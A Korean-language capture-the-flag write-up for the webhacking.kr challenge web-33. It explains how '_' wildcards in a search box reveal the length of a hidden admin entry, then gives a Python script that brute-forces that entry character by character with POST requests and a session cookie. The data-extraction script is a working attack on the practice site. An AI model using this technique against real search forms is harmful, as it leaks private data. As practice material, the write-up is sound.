문제 먼저 분석해보자 
admin guest가 나와있다 
read file을 눌러도 access denied 라며 거부된다 
어떻게 뚫어야 할까? 일단 검색창이 있으니 이 부분이 기본적인 attack vector가 될 거라 
기대할 수 있다 sql injection을 시도해본다 
1이나 or 등 많은 것들을 시도해보아도 별다른 반응이 없다 
그러나 그 후에 hello 같은 것들을 쳐보면서 
내용에 검색값이 있으면 그 조건에 해당하는 내용을 출력해주는 검색문이라는 걸 알 수 있다
_ _ _ 을 붙여서 쳐서 admin이 총 길이가 얼마나 되는지 파악한다 
__을 쳤을 때 admin과 guest가 계속해서 검색되는 이유는 나도 잘 모르겠다 
아무튼 그렇게 계속 검색되어지고 길이가 ____ 붙인 값을 넘어가는 순간 출력이 되지 않는다
따라서 그걸 붙여서 치면 얼마나 길이가 되는지 총 길이를 알 수 있게 된다 
guest는 6자리 admin은 44자리이다 
대부분 이런 식으로 자리 값을 알면 브루트 포싱을 하면 원하는 값을 얻을 수 있다 


import requests 
url = 'https://webhacking.kr/challenge/web-33/'

answer = ''
for i in range(1, 45):
    for j in range(97, 126):
        cookies = {'PHPSESSID' : 'bdp7qgm2n9avlpfsc7th16g3l7'}
        tem = answer
        tem += chr(j)
        tem += '_'*(44-i) 
        data = {'search' : tem}
        response = requests.post(cookies=cookies, url=url, data=data, verify=False)
        print (data)
        if(response.text.find('admin')!=-1):
            answer += chr(j)
            break
print (answer) 

굉장히 재미있는 브루트 포싱 문제였다 
중간에 필요없는 skipping 부분은 과감히 걷어내버렸다. 
그리고 나서 ssrf 때 배웠던 지식을 활용해서 
python main.py web-33 을 실행해주었다. 
python 명령어를 실행한 다음 뒤에 넣는 건 port 값이 아니었다 
(물론, 드림이랑 놀 때는 port값 그대로 일 거 같긴 한데) webhacking.kr에서 실행할 때는 
port가 아니라 뒤에 나온 내용을 그대로 쳐 넣으면 되는 것이었다 
즉 이번에는 web-33이 url 에 나와있으니 그걸 넣으면 되는 것이다 
flag{himiko...} 플래그를 얻었다 ! 
